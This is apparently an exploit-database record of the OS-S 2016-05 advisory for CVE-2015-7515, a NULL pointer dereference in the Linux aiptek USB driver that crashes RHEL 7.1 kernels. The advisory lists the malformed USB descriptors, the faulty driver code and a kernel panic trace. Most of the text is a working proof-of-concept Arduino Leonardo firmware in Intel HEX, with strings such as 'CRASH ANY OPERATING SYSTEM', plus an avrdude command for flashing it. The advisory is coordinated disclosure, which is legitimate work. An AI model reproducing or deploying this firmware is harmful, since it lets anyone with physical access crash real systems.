:100590008083E0E9F0E0808181608083E1ECF0E03D
:1005A000808184608083808182608083808181609B
:1005B0008083E3ECF0E0808181608083E0ECF0E018
:1005C000808182608083E2ECF0E0808181608083C2
:1005D000EAE7F0E0808184608083808182608083AC
:1005E000808181608083808180688083089590E02D
:1005F000FC013197EE30F10590F5EA5AFF4F0C946B
:10060000AB09809180008F7703C0809180008F7D3F
:1006100080938000089584B58F7702C084B58F7D64
:1006200084BD0895809190008F7707C080919000DD
:100630008F7D03C080919000877F80939000089504
:100640008091C0008F7703C08091C0008F7D809320
:10065000C00008958091C200877F8093C2000895F2
:10066000CF93DF9390E0FC01EA51FF4F2491FC010E
:10067000EC5FFE4F8491882349F190E0880F991F29
:10068000FC01E25CFE4FA591B491805D9E4FFC01A0
:10069000C591D4919FB7611108C0F8948C912095B1
:1006A00082238C93888182230AC0623051F4F894AB
:1006B0008C91322F309583238C938881822B888371
:1006C00004C0F8948C91822B8C939FBFDF91CF91C3
:1006D00008950F931F93CF93DF931F92CDB7DEB78B
:1006E000282F30E0F901E853FF4F8491F901EA51D6
:1006F000FF4F1491F901EC5FFE4F04910023C9F004
:10070000882321F069830E94F7026981E02FF0E0DD
:10071000EE0FFF1FE05DFE4FA591B4919FB7F894D7
:100720008C91611103C01095812301C0812B8C93A2
:100730009FBF0F90DF91CF911F910F910895CF939D
:10074000DF93282F30E0F901E853FF4F8491F9013E
:10075000EA51FF4FD491F901EC5FFE4FC491CC23D5
:1007600091F081110E94F702EC2FF0E0EE0FFF1FD5
:10077000EE5DFE4FA591B4912C912D2381E090E088
:1007800021F480E002C080E090E0DF91CF910895F5
:10079000615030F02091F100FC0120830196F8CFE8
:1007A000289884E680937D0508951092E9001092C0
:1007B00071051092700590936F0580936E050895F2
:1007C000FF920F931F93CF93DF93F82E8B01EA01D3
:1007D000BA01C8010E94A606F80120E030E08EEFC1
:1007E0002C173D0791F1F7FE02C0A49101C0A08132
:1007F000609170057091710540916E0550916F0583
:1008000064177507ACF49091E8009570E1F390914E
:10081000E80092FD1CC0A093F100A0917005B0917A
:1008200071051196AF73BB27AB2B11F48093E800D1
:10083000A0917005B09171051196B0937105A093C8
:1008400070052F5F3F4F3196CBCFC90102C08FEFAC
:100850009FEFDF91CF911F910F91FF9008951F920D
:100860000F920FB60F9211246F927F928F929F92E8
:10087000AF92BF92CF92DF92EF92FF920F931F93AE
:100880002F933F934F935F936F937F938F939F9398
:10089000AF93BF93EF93FF93CF93DF93CDB7DEB7C3
:1008A0006297DEBFCDBF1092E9008091E80083FF20
:1008B00046C168E0CE010A960E94C80382EF809389
:1008C000E8009A8597FF05C08091E80080FFFCCF83
:1008D00003C08EEF8093E800892F807609F023C152
:1008E0008B85811105C01092F1001092F10020C19A
:1008F000282F2D7F213009F41BC1853049F48091C8
:10090000E80080FFFCCF8C8580688093E30010C1F5
:10091000863009F0E1C02D8508891989223009F057
:10092000B3C0EC848E2D90E0209173053091740556
:10093000821793070CF09FC00E94D5031F92EF927D
:100940008DE394E09F938F930E9483068CE0E89E52
:1009500070011124E0917505F0917605EE0DFF1DF3
:1009600089E0DE01119601900D928A95E1F7C801A8
:100970000E94D50349E050E0BE016F5F7F4F80E0E9
:100980000E94E0030F900F900F900F90C12CD12C7C
:10099000612C712C33E7A32E34E0B32E4AEA842E67
:1009A00044E0942EE0917505F0917605EE0DFF1D63
:1009B000818590E0681679060CF0BAC07F926F923C
:1009C000BF92AF920E948306E0917505F091760583
:1009D000EE0DFF1D628573856C0D7D1D49E050E0B5
:1009E00080E00E94E0030F900F900F900F9000E0C6
:1009F00010E0E0917505F0917605EE0DFF1D028483
:100A0000F385E02DEC0DFD1D818590E00817190799
:100A10005CF51F930F939F928F920E948306E09143
:100A20007505F0917605EE0DFF1D0284F385E02D2E
:100A3000EC0DFD1DC801880F991FA485B585A80F71
:100A4000B91F4D915C910284F385E02DE80FF91FE9
:100A50006081718180E00E94E0030F5F1F4F0F9063
:100A60000F900F900F90C5CF8FEF681A780A8EE025
:100A7000C80ED11C97CF8FED94E09F938F930E9467
:100A800083060F900F9058C0C8012A8B0E94D5038F
:100A90002A892130C1F0233009F04EC08C851F9285
:100AA0008F9389EF94E09F938F930E94830642E097
:100AB00050E062E871E080E00E94E0030F900F9048
:100AC0000F900F9035C04091000150E060E071E060
:100AD00080E00E94E0032CC0873071F1883021F45F
:100AE00081E08093F10024C0893011F5937021F5E5
:100AF000EDE4F1E081E021E096E38093E9002093CA
:100B0000EB0034913093EC009093ED008F5F3196C1
:100B1000843099F78EE78093EA001092EA008C8582
:100B20008093720505C0888999890E94D50304C005
:100B30008EEF8093E80003C081E28093EB00629621
:100B40000FB6F894DEBF0FBECDBFDF91CF91FF91FE
:100B5000EF91BF91AF919F918F917F916F915F9135
:100B60004F913F912F911F910F91FF90EF90DF9048
:100B7000CF90BF90AF909F908F907F906F900F908D
:100B80000FBE0F901F9018951F920F920FB60F92E5
:100B900011248F939F938091E1001092E10083FFD5
:100BA0000FC01092E90091E09093EB001092EC00DE
:100BB00092E39093ED001092720598E09093F0000C
:100BC00082FF1AC080917E05882339F080917E05CE
:100BD000815080937E05882369F080917D0588236C
:100BE00059F080917D05815080937D05811104C06D
:100BF000289A02C05D9AF1CF9F918F910F900FBEFE
:100C00000F901F901895CF93DF93CDB7DEB782E199
:100C1000FE013596A0E0B1E001900D928A95E1F7D2
:100C20008F89988D9093760580937505898D9A8D1F
:100C300090937405809373058B8D9C8D90937C05A8
:100C400080937B058D8D9E8D90937A058093790599
:100C50008F8D98A1909378058093770510927205F7
:100C600081E08093D70080EA8093D80082E189BD3B
:100C700009B400FEFDCF61E070E080E090E00E94EA
:100C80007B0280E98093D8008CE08093E200109290
:100C9000E000559A209ADF91CF91089581E08093EA
:100CA000E00008959091C80095FFFCCF8093CE009E
:100CB00008951092CD0087E68093CC0088E1809360
:100CC000C9008EE08093CA0008950F931F93CF93BD
:100CD000DF93EC018C01FE0101900020E9F73197D0
:100CE000EC1BFD0BC8018C1B9D0B8E179F0730F46E
:100CF000F80181918F010E945206EDCFDF91CF91D3
:100D00001F910F910895CF93DF93CDB7DEB7DA959A
:100D10000FB6F894DEBF0FBECDBFFE01EB5FFE4FF6
:100D2000419151919F0160E071E0CE0101960E94D6
:100D30000707CE0101960E946506D3950FB6F89479
:100D4000DEBF0FBECDBFDF91CF9108958F929F92EE
:100D5000AF92BF92CF92DF92EF92FF920F931F93C9
:100D6000CF93DF9300D0CDB7DEB75B0122E535E04E
:100D70003F932F9389839A830E9483068981882ECB
:100D80009A81992E0F900F9000E010E08EE5E82EEA
:100D900085E0F82E91E1C92E94E0D92E0A151B05A5
:100DA000E4F4F40181914F0190E09F938F93FF92BF
:100DB000EF920E9483060F5F1F4FC8018F70992723
:100DC0000F900F900F900F90892B41F7DF92CF92E9
:100DD0000E9483060F900F90E1CF81E194E09F93F2
:100DE0008F930E9483060F900F900F900F90DF91CA
:100DF000CF911F910F91FF90EF90DF90CF90BF9018
:100E0000AF909F908F900895F8940C94E809AEE00D
:100E1000B0E0EDE0F7E00C94BF098C01CA0146E0B8
:100E20004C831A83098377FF02C060E070E8615049
:100E300071097E836D83A901BC01CE0101960E94D8
:100E400033074D815E8157FD0AC02F8138854217D7
:100E500053070CF49A01F801E20FF31F10822E964B
:100E6000E4E00C94DB09ACE0B0E0E9E3F7E00C94DB
:100E7000B1097C016B018A01FC0117821682838112
:100E800081FFBDC1CE0101964C01F7019381F601AE
:100E900093FD859193FF81916F01882309F4ABC184
:100EA000853239F493FD859193FF81916F018532ED
:100EB00029F4B70190E00E941B09E7CF512C312C97
:100EC00020E02032A0F48B3269F030F4803259F007
:100ED000833269F420612CC08D3239F0803339F4CB
:100EE000216026C02260246023C0286021C027FD25
:100EF00027C030ED380F3A3078F426FF06C0FAE00C
:100F00005F9E300D1124532E13C08AE0389E300DA1
:100F10001124332E20620CC08E3221F426FD6BC1C9
:100F2000206406C08C3611F4206802C0883641F473
:100F3000F60193FD859193FF81916F018111C1CFDE
:100F4000982F9F7D9554933028F40C5F1F4FFFE33B
:100F5000F9830DC0833631F0833771F0833509F0A2
:100F60005BC022C0F801808189830E5F1F4F44243B
:100F70004394512C540115C03801F2E06F0E711CDE
:100F8000F801A080B18026FF03C0652D70E002C08B
:100F90006FEF7FEFC5012C870E9410092C018301A0
:100FA0002C852F77222E17C03801F2E06F0E711CAE
:100FB000F801A080B18026FF03C0652D70E002C05B
:100FC0006FEF7FEFC5012C870E9405092C012C854E
:100FD0002068222E830123FC1BC0832D90E048163D
:100FE0005906B0F4B70180E290E00E941B093A94E0
:100FF000F4CFF50127FC859127FE81915F01B701B0
:1010000090E00E941B0931103A94F1E04F1A510808
:101010004114510471F7E5C0843611F0893639F571
:10102000F80127FF07C060817181828193810C5F85
:101030001F4F08C060817181882777FD8095982FA8
:101040000E5F1F4F2F76B22E97FF09C090958095A7
:10105000709561957F4F8F4F9F4F2068B22E2AE089
:1010600030E0A4010E944D09A82EA81844C085377D
:1010700029F42F7EB22E2AE030E025C0F22FF97F2E
:10108000BF2E8F36C1F018F4883579F0B4C08037A0
:1010900019F0883721F0AFC02F2F2061B22EB4FE97
:1010A0000DC08B2D8460B82E09C024FF0AC09F2F6D
:1010B0009660B92E06C028E030E005C020E130E09F
:1010C00002C020E132E0F801B7FE07C06081718103
:1010D000828193810C5F1F4F06C06081718180E027
:1010E00090E00E5F1F4FA4010E944D09A82EA81882
:1010F000FB2DFF77BF2EB6FE0BC02B2D2E7FA51428
:1011000050F4B4FE0AC0B2FC08C02B2D2E7E05C0E0
:101110007A2C2B2D03C07A2C01C0752C24FF0DC016
:10112000FE01EA0DF11D8081803311F4297E09C092
:1011300022FF06C07394739404C0822F867809F04E
:10114000739423FD13C020FF06C05A2C731418F4A7
:10115000530C5718732C731468F4B70180E290E0B5
:101160002C870E941B0973942C85F5CF731410F4FF
:10117000371801C0312C24FF12C0B70180E390E082
:101180002C870E941B092C8522FF17C021FF03C05A
:1011900088E590E002C088E790E0B7010CC0822F9C
:1011A000867859F021FD02C080E201C08BE227FD64
:1011B0008DE2B70190E00E941B09A51438F4B70135
:1011C00080E390E00E941B095A94F7CFAA94F4019F
:1011D000EA0DF11D8081B70190E00E941B09A1106A
:1011E000F5CF332009F451CEB70180E290E00E94A0
:1011F0001B093A94F6CFF7018681978102C08FEFE1
:101200009FEF2C96E2E10C94CD09FC010590615012
:1012100070400110D8F7809590958E0F9F1F08950C
:10122000FC016150704001900110D8F780959095B5
:101230008E0F9F1F08950F931F93CF93DF93182F47
:10124000092FEB018B8181FD03C08FEF9FEF20C041
:1012500082FF10C04E815F812C813D814217530770
:101260007CF4E881F9819F012F5F3F4F3983288308
:10127000108306C0E885F985812F0995892B29F708
:101280002E813F812F5F3F4F3F832E83812F902FF1
:10129000DF91CF911F910F910895FA01AA2728306D
:1012A00051F1203181F1E8946F936E7F6E5F7F4F33
:1012B0008F4F9F4FAF4FB1E03ED0B4E03CD0670FAF
:1012C000781F891F9A1FA11D680F791F8A1F911D02
:1012D000A11D6A0F711D811D911DA11D20D009F452
:1012E00068943F912AE0269F11243019305D319394
:1012F000DEF6CF010895462F4770405D4193B3E07D
:101300000FD0C9F7F6CF462F4F70405D4A3318F023
:10131000495D31FD4052419302D0A9F7EACFB4E0D4
:10132000A6959795879577956795BA95C9F700978C
:101330006105710508959B01AC010A2E069457952D
:10134000479537952795BA95C9F7620F731F841F84
:10135000951FA01D0895EE0FFF1F0590F491E02D3D
:1013600009942F923F924F925F926F927F928F9249
:101370009F92AF92BF92CF92DF92EF92FF920F9324
:101380001F93CF93DF93CDB7DEB7CA1BDB0B0FB62E
:10139000F894DEBF0FBECDBF09942A8839884888EB
:1013A0005F846E847D848C849B84AA84B984C88481
:1013B000DF80EE80FD800C811B81AA81B981CE0F78
:1013C000D11D0FB6F894DEBF0FBECDBFED0108955D
:0413D000F894FFCFBF
:1013D4001201000200000040AD0BEFBE000101024B
:1013E4000001220342006100640020004200410029
:1013F40042004500250078002500780025006E0095
:1014040025007000180342004100440020004300FE
:10141400300046004600450045002100120100024C
:10142400000000404C0544010001010203010902CF
:10143400270001010000FA0705810104040C0705D7
:10144400010104000C0705820104000C07000700D9
:101454000700480100500072006F006C00690066CC
:101464000069006300000A550000006BFD180A00C3
:10147400809F0AB901312B940A8101128946001315
:10148400000257028B0A5E0AF80A5F01F212010099
:1014940002010000400D055702000101020301B9D9
:1014A4000A0100F80A5F0A810A220342006100640B
:1014B400002000420041004200450025007800253C
:1014C40000780025006E00250070001803420041DA
:1014D400004400200043003000460046004500451B
:1014E40000210012010002010000400D0557020016
:1014F400010102030109040000030100000003F2DA
:101504000AEC0A0902270001010000FA01AB0A09EA
:101514000400000301000000090200202020202014
:101524005F5F5F5F5F5F5F5F2020202020202020BF
:1015340020202020202020202020202020202020A7
:1015440020205F5F5F5F5F205F5F20205F2020209F
:101554002020205F5F0A0D00202020202F205F5FC5
:101564005F5F2F202F5F20205F5F5F5F205F5F5FE3
:101574005F5F20205F5F5F5F5F20202020202F209F
:101584005F5F5F2F2F202F5F285F295F5F5F5F2FD3
:10159400202F5F5F0A0D002020202F202F202020E5
:1015A4002F205F5F205C2F205F5F20602F205F5F14
:1015B400205C2F205F5F5F2F5F5F5F5F205C5F5F5A
:1015C400205C2F205F5F2F202F205F5F5F2F202F55
:1015D4002F5F2F0A0D0020202F202F5F5F5F2F2009
:1015E4002F202F202F202F5F2F202F202F5F2F2001
:1015F400285F5F2020292F5F5F5F2F205F5F2F20F0
:101604002F202F5F2F202F202F5F5F2F202C3C0AAD
:101614000D0020205C5F5F5F5F2F5F2F202F5F2F07
:101624005C5F5F2C5F2F5C5F5F5F5F2F5F5F5F5F5F
:101634002F20202020202F5F5F5F5F2F5C5F5F2FB4
:101644005F2F5C5F5F5F2F5F2F7C5F7C0A0D002044
:101654003C3C2043485241534820414E59204F506E
:1016640045524154494E472053595354454D203E09
:101674003E0A0D00203C3C202863292053657267F4
:10168400656A20536368756D696C6F20323031353B
:101694002C204F70656E536F7572636520536563BC
:1016A40075726974792052616C66205370656E6E30
:1016B4006562657267203E3E0A0D000A3E3E205078
:1016C4007265737320627574746F6E20746F207307
:1016D4007461727420657865637574696F6E2E2EFB
:1016E4002E0A0D005B44454255475D2045786563ED
:1016F400757465207061796C6F616420300A0D0027
:10170400526563762D446174613A0A0D005B444569
:101714004255475D200953656E6420436F6E6669C8
:101724006775726174696F6E44657363726970740E
:101734006F720928696E6465783A2569292E2E2E00
:101744000D0A005B44454255475D200953656E64AC
:1017540020496E74657266616365204465736372C3
:101764006970746F720928696E7465726661636565
:101774003A2569292E2E2E0D0A005B444542554711
:101784005D200953656E6420456E64706F696E74E4
:101794002044657363726970746F720928656E649E
:1017A400706F696E743A2569292E2E2E0D0A005B1E
:1017B40044454255475D203C3C70616E6963206D31
:1017C4006F64653F3E3E0D0A005B44454255475DEC
:1017D4002009203E3E20537472696E67204465736D
:1017E40063726970746F72207265717565737420A9
:1017F4002D2073656E64696E67206D616C666F720F
:101804006D656420737472696E67212073657475E5
:10181400702E7756616C75654C203D3D2025690D11
:101824000A005B48455844554D505D0A0D0025306B
:041834003258200006
:00000001FF"
3327,OS-S 2016-05 Linux aiptek Nullpointer Dereference CVE-2015-7515,,CVE-2015-7515,"OS-S Security Advisory 2016-05
Linux aiptek Nullpointer Dereference
Date: March 4th, 2016
Authors: Sergej Schumilo, Hendrik Schwartke, Ralf Spenneberg
CVE: CVE-2015-7515
CVSS: 4.9 (AV:L/AC:L/Au:N/C:N/I:N/A:C)
Title: Local RedHat Enterprise Linux DoS – RHEL 7.1 Kernel crashes on invalid
USB device descriptors (aiptek driver)
Severity: Critical. The Kernel panics. A reboot is required.
Ease of Exploitation: Trivial
Vulnerability type: Wrong input validation
Products: RHEL 7.1 including all updates
Kernel-Version: 3.10.0-229.20.1.el7.x86_64 (for debugging-purposes we used the
CentOS Kernel kernel-debuginfo-3.10.0-229.14.1.el7)
Vendor: Red Hat
Vendor contacted: November, 12th 2015
PDF of Advisory: https://os-s.net/advisories/OSS-2016-05_aiptek.pdf
Abstract:
The Kernel 3.10.0-229.20.1.el7.x86_64 crashes when presented a buggy USB
device using the aiptek driver.
Detailed product description:
We confirmed the bug on the following system:
RHEL 7.1
Kernel 3.10.0-229.20.1.el7.x86_64
Further products or kernel versions have not been tested.
How reproducible: Always
Actual results: Kernel crashes.
Description:
The bug was found using the USB-fuzzing framework vUSBf from Sergej Schumilo
(github.com/schumilo) using the following device descriptor:
[*] Device-Descriptor
bLength: 0x12
bDescriptorType: 0x1
bcdUSB: 0x200
bDeviceClass: 0x3
bDeviceSubClass: 0x0
bDeviceProtocol: 0x0
bMaxPacketSize: 0x40
idVendor: 0x458
idProduct: 0x5003
bcdDevice: 0x100
iManufacturer: 0x1
iProduct: 0x2
iSerialNumbers: 0x3
bNumConfigurations: 0x1
[*] Configuration-Descriptor
bLength: 0x9
bDescriptorType: 0x2
wTotalLength: 0x27
bNumInterfaces: 0x1
bConfigurationValue: 0x1
iConfiguration: 0x0
bmAttributes: 0x0
bMaxPower: 0x31
[*] Interface-Descriptor
bLength: 0x9
bDescriptorType: 0x4
bInterfaceNumber: 0x0
bAlternateSetting: 0x0
bNumEndpoints: 0x0
bInterfaceClass: 0x0
bInterfaceSubClass: 0x0
bInterfaceProtocol: 0x0
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x81
bmAttribut: 0x3
wMaxPacketSize: 0x404
bInterval: 0xc
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x1
bmAttribut: 0x2
wMaxPacketSize: 0x4
bInterval: 0xc
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x82
bmAttribut: 0x1
wMaxPacketSize: 0x4
bInterval: 0xc
The aiptek driver assumes that there will be at least one endpoint-descriptor.
If the interface-descriptor contains a zero-value for bNumEndpoints or no
endpoint-descriptor is provided, the driver tries to dereference a null-
pointer and the kernel crashes:
****
$ nm aiptek.ko.debug | grep aiptek_probe
0000000000001ea0 t aiptek_probe
$ addr2line -e aiptek.ko.debug 2303
/usr/src/debug/kernel-3.10.0-229.14.1.el7/linux-3.10.0-229.14.1.el7.x86_64/drivers/input/tablet/aiptek.c:1830
****
**** CentOS-Kernel linux-3.10.0-229.14.1.el7 (drivers/input/tablet/aiptek.c)
1822 endpoint = &intf->altsetting[0].endpoint[0].desc; /* Nullpointer */
1823
1824 /* Go set up our URB, which is called when the tablet receives
1825 * input.
1826 */
1827 usb_fill_int_urb(aiptek->urb,
1828 aiptek->usbdev,
1829 usb_rcvintpipe(aiptek->usbdev,
1830 endpoint->bEndpointAddress), /* Nullpointer-
Dereference */
1831 aiptek->data, 8, aiptek_irq, aiptek,
1832 endpoint->bInterval);
****
Proof of Concept:
For a proof of concept, we are providing an Arduino Leonardo firmware file. This
firmware will emulate the defective USB device.
avrdude -v -p ATMEGA32u4 -c avr109 -P /dev/ttyACM0 -b 57600 -U
flash:w:binary.hex
The firmware has been attached to this bug report.
To prevent the automated delivery of the payload, a jumper may be used to
connect port D3 and 3V3!
Severity and Ease of Exploitation:
The vulnerability can be easily exploited. Using our Arduino Leonardo firmware,
only physical access to the system is required.
Vendor Communication:
We contacted Red Hat on the November, 12th 2015.
A patch was provided on the November, 25th 2015.
References:
https://bugzilla.redhat.com/show_bug.cgi?id=1285326
https://bugzilla.redhat.com/show_bug.cgi?id=1283350
Kernel Stacktrace:
[ 622.149957] usb 1-1: new full-speed USB device number 2 using xhci_hcd
[ 622.354485] usb 1-1: config 1 interface 0 altsetting 0 has 3 endpoint
descriptors, different from the interface descriptor's value: 0
[ 622.386630] usb 1-1: New USB device found, idVendor=0458, idProduct=5003
[ 622.392414] usb 1-1: New USB device strings: Mfr=1, Product=2,
SerialNumber=3
[ 622.399416] usb 1-1: Product: ĉ
[ 622.404640] usb 1-1: Manufacturer: ĉ
[ 622.410079] usb 1-1: SerialNumber: %
[ 622.444650] BUG: unable to handle kernel NULL pointer dereference at
0000000000000002
[ 622.445019] IP: [<ffffffffa0395303>] aiptek_probe+0x463/0x658 [aiptek]
[ 622.445019] PGD 0
[ 622.445019] Oops: 0000 [#1] SMP
[ 622.445019] Modules linked in: aiptek(+) ip6t_rpfilter ip6t_REJECT
ipt_REJECT xt_conntrack ebtable_nat ebtable_broute bridge stp llc
ebtable_filter ebtables ip6table_nat nf_conntrack_ipv6 nf_defrag_ipv6
nf_nat_ipv6 ip6table_mangle ip6table_security ip6table_raw ip6table_filter
ip6_tables iptable_nat nf_conntrack_ipv4 nf_defrag_ipv4 nf_nat_ipv4 nf_nat
nf_conntrack iptable_mangle iptable_security iptable_raw iptable_filter
ip_tables bochs_drm ppdev syscopyarea sysfillrect sysimgblt ttm drm_kms_helper
drm pcspkr i2c_piix4 i2c_core serio_raw parport_pc parport xfs libcrc32c
sd_mod sr_mod crc_t10dif cdrom crct10dif_common ata_generic pata_acpi ata_piix
libata e1000 floppy dm_mirror dm_region_hash dm_log dm_mod
[ 622.445019] CPU: 0 PID: 2242 Comm: systemd-udevd Not tainted
3.10.0-229.14.1.el7.x86_64 #1
[ 622.445019] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
rel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014
[ 622.445019] task: ffff88000e65a220 ti: ffff88000f4cc000 task.ti: ffff88000f4cc000
[ 622.445019] RIP: 0010:[<ffffffffa0395303>] [<ffffffffa0395303>]
aiptek_probe+0x463/0x658 [aiptek]
[ 622.445019] RSP: 0018:ffff88000f4cfb80 EFLAGS: 00010286
[ 622.445019] RAX: 0000000000000000 RBX: ffff88000bd67800 RCX: ffff88000bcd0800
[ 622.445019] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff88000ca29000
[ 622.445019] RBP: ffff88000f4cfbe0 R08: 0000000000000000 R09: 0000000000000000
[ 622.445019] R10: ffff88000e401400 R11: ffffffff810020d8 R12: ffff88000c525800
[ 622.445019] R13: ffff88000c525830 R14: ffff88000bcd1800 R15: ffff88000bd67834
[ 622.445019] FS: 00007fb8082b4880(0000) GS:ffff88000fc00000(0000)
knlGS:0000000000000000
[ 622.445019] CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[ 622.445019] CR2: 0000000000000002 CR3: 000000000d67f000 CR4:
00000000000006f0
[ 622.445019] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000
[ 622.445019] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[ 622.445019] Stack:
[ 622.445019] ffff88000bcd0800 0000000000000001 0000019000000246
0000019000000032
[ 622.445019] 0000006400000019 0000012c000000c8 000000000cc3e092
ffff88000bcd0890
[ 622.445019] ffff88000bcd0800 ffffffffa0397068 ffff88000c525830 ffffffffa03965c0
[ 622.445019] Call Trace:
[ 622.445019] [<ffffffff8141dc04>] usb_probe_interface+0x1c4/0x2f0
[ 622.445019] [<ffffffff813d30d7>] driver_probe_device+0x87/0x390
[ 622.445019] [<ffffffff813d34b3>] __driver_attach+0x93/0xa0
[ 622.445019] [<ffffffff813d3420>] ? __device_attach+0x40/0x40
[ 622.445019] [<ffffffff813d0e43>] bus_for_each_dev+0x73/0xc0
[ 622.445019] [<ffffffff813d2b2e>] driver_attach+0x1e/0x20
[ 622.445019] [<ffffffff813d2680>] bus_add_driver+0x200/0x2d0
[ 622.445019] [<ffffffff813d3b34>] driver_register+0x64/0xf0
[ 622.445019] [<ffffffff8141c1c2>] usb_register_driver+0x82/0x160
[ 622.445019] [<ffffffffa039a000>] ? 0xffffffffa0399fff
[ 622.445019] [<ffffffffa039a01e>] aiptek_driver_init+0x1e/0x1000 [aiptek]
[ 622.445019] [<ffffffff810020e8>] do_one_initcall+0xb8/0x230
[ 622.445019] [<ffffffff810dd0ee>] load_module+0x133e/0x1b40
[ 622.445019] [<ffffffff812f7d60>] ? ddebug_proc_write+0xf0/0xf0
[ 622.445019] [<ffffffff810d96b3>] ? copy_module_from_fd.isra.42+0x53/0x150
[ 622.445019] [<ffffffff810ddaa6>] SyS_finit_module+0xa6/0xd0
[ 622.445019] [<ffffffff81614389>] system_call_fastpath+0x16/0x1b
[ 622.445019] Code: 45 31 c9 45 31 c0 b9 ff 03 00 00 be 08 00 00 00 4c 89 f7
e8 90 39 0d e1 49 8b 04 24 48 8b 4b 08 48 8b bb 10 01 00 00 48 8b 40 18 <0f>
b6 50 02 0f b6 70 06 8b 01 c1 e2 0f c1 e0 08 81 ca 80 00 00
[ 622.445019] RIP [<ffffffffa0395303>] aiptek_probe+0x463/0x658 [aiptek]
[ 622.445019] RSP <ffff88000f4cfb80>
[ 622.445019] CR2: 0000000000000002
[ 622.860772] ---[ end trace b239663354a1c556 ]---
[ 622.864813] Kernel panic - not syncing: Fatal exception
[ 622.865768] drm_kms_helper: panic occurred, switching back to text console
Arduino Leonardo Firmware:
:100000000C94A8000C94C5000C94C5000C94C50079
:100010000C94C5000C94C5000C94C5000C94C5004C
:100020000C94C5000C94C5000C94C2050C942D04CE
:100030000C94C5000C94C5000C94C5000C94C5002C
:100040000C94C5000C94C5000C94C5000C94C5001C
:100050000C94C5000C94C5000C94C5000C940C02C3
:100060000C94C5000C94C5000C94C5000C94C500FC
:100070000C94C5000C94C5000C94C5000C94C500EC
:100080000C94C5000C94C5000C94C5000C94C500DC
:100090000C94C5000C94C5000C94C5000C94C500CC
:1000A0000C94C5000C94C5000C94C50009030C0306
:1000B000FF0203032D032D032D0310031403180364
:1000C0001E0322032D0328030000000200080E0077
:1000D00000030401000B000000000000000000000D
:1000E00000000000000004080201104080401020C1
:1000F00040804080080204018040201002011080EE
:100100001020404004040404040304050202020217
:1001100004030202020206060606060604040202A0
:100120000204000000002300260029002C002F00FC
:1001300000000000250028002B002E0031000000E8
:100140000000240027002A002D00300000C180811B
:1001500011241FBECFEFDAE0DEBFCDBF15E0A0E077
:10016000B1E0E0EDF3E102C005900D92A436B107D5
:10017000D9F725E0A4E6B5E001C01D92AF37B2077C
:10018000E1F70E94C8000C9402070C940000089547
:10019000CF93DF93CDB7DEB7CD59D1090FB6F89421
:1001A000DEBF0FBECDBF0E949F020E94C70060E06D
:1001B00083E00E942E0361E087E00E942E0361E04D
:1001C00088E00E942E030E9457067E012AE9E20E73
:1001D000F11C84E093E0D70111969C938E9389E003
:1001E00094E013969C938E93129782E2E2E1F1E001
:1001F0009E012F5F3F4F6901D90101900D928A95B1
:10020000E1F788E1E4E3F1E0DE01939601900D92DD
:100210008A95E1F782E1ECE4F1E0DE01DB96019002
:100220000D928A95E1F789E0EEE5F1E0DE01A05953
:10023000BF4F01900D928A95E1F72A593F4F99E0FF
:10024000992ED901E92D1D92EA95E9F78E010957FA
:100250001F4F87E0E7E6F1E0D80101900D928A9503
:10026000E1F7BE0160587F4F87E0EEE6F1E0DB0189
:1002700001900D928A95E1F7AE0147585F4F87E0F4
:10028000E5E7F1E0DA0101900D928A95E1F75E0170
:10029000FEE8AF0EB11C86E0ECE7F1E0D50101907D
:1002A0000D928A95E1F7CE01835B9F4FEEE0DC0172
:1002B0001D92EA95E9F7E3E0DC011996EC93F90168
:1002C0009082E4E0D9011196EC93F901DC01292D2B
:1002D00001900D922A95E1F7FE01EC56FF4FDC01EB
:1002E0001B96FC93EE931A971D96BC92AE921C97A8
:1002F0001183008373836283558344830C521109F5
:100300002CE0F80111922A95E9F721E0D80119961D
:100310002C931997FE01E059FF4F01900D929A948A
:10032000E1F7F8019387828761E088E00E94670324
:100330008BE492E00E94630688E892E00E946306E4
:1003400087EC92E00E94630686E093E00E946306D9
:1003500082E493E00E9463068FE793E00E946306C5
:1003600084EA93E00E9463068BEE93E00E946306AA
:1003700083E00E949D03892B09F047C05E01F3E2F0
:10038000AF0EB11C8824839482E1982E84E194E01E
:100390000E946306BF92AF92DF92CF92FF92EF92DC
:1003A0001F928F921F930F932DB73EB722513109A1
:1003B0000FB6F8943EBF0FBE2DBFADB7BEB71196B6
:1003C000FE01FB96892D01900D928A95E1F78DE64D
:1003D00095E00E94010668E873E180E090E00E94E9
:1003E00079028DE695E00E944C0660E087E00E946D
:1003F000670368E873E180E090E00E9479020FB63D
:10040000F894DEBF0FBECDBFC1CF6AE070E080E0E0
:1004100090E00E947902ACCF1F920F920FB60F921C
:1004200011242F933F938F939F93AF93BF9380910A
:10043000650590916605A0916705B09168053091BA
:10044000640523E0230F2D3720F40196A11DB11D73
:1004500005C026E8230F0296A11DB11D2093640557
:100460008093650590936605A0936705B093680532
:100470008091690590916A05A0916B05B0916C051A
:100480000196A11DB11D8093690590936A05A09303
:100490006B05B0936C05BF91AF919F918F913F9188
:1004A0002F910F900FBE0F901F9018953FB7F894A3
:1004B0008091690590916A05A0916B05B0916C05DA
:1004C00026B5A89B05C02F3F19F00196A11DB11DAF
:1004D0003FBF6627782F892F9A2F620F711D811DCC
:1004E000911D42E0660F771F881F991F4A95D1F72B
:1004F0000895CF92DF92EF92FF92CF93DF936B013B
:100500007C010E945602EB01C114D104E104F10404
:1005100079F00E9456026C1B7D0B683E7340A0F37D
:1005200081E0C81AD108E108F108C851DC4FECCFCE
:10053000DF91CF91FF90EF90DF90CF900895789466
:1005400084B5826084BD84B5816084BD85B58260D8
:1005500085BD85B5816085BDEEE6F0E08081816076
:100560008083E1E8F0E01082808182608083808176
:1005700081608083E0E8F0E0808181608083E1E950
:10058000F0E0808182608083808181608083E0E907
:10059000F0E0808181608083E1ECF0E08081846024
:1005A0008083808182608083808181608083E3ECAE
:1005B000F0E0808181608083E0ECF0E08081826007
:1005C0008083E2ECF0E0808181608083EAE7F0E004
